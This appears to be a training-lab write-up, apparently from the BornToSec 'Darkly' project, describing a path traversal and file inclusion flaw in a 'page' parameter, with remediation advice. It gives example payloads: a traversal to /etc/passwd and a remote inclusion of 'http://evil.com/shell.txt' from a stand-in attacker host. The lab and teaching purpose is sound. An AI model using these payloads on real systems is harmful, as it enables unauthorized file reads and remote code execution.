# Path Traversal & File Inclusion

## Observation

Navigation to pages other than Home seems to depend on the "page" parameter, when trying http://192.168.56.102/index.php?page=test an alert appeared :
	
	<script>alert('Wtf ?');</script><!DOCTYPE HTML>
	<html>
		<head>
			<title>BornToSec - Web Section</title>
			
when trying with few level of relative path (like ../../etc/passwd), each time we got a different alert message.

## Vulnerability Identified

- Path Traversal (or Directory Traversal) : Manipulating file paths to access files (config files, sources code, logs...) outside the indented directory. 

	Ex: http://site.com?page=../../etc/passwd 


- File Inclusion : Abusing a file-include feature to get unauthorized locals files (LFI) or execute malicious external file (EFI).

	Ex: http://site.com?page=http://evil.com/shell.txt

These vulnerabilities are caused by unsanitized user inputs and/or lack of access control to resources.


## How to avoid the breach

-> Sanitize correctly user input or not use user input directly in file paths.  
-> Resolve the real path and ensure it stays within an allowed directory.  
-> Can use a Whitelist-Based File Mapping  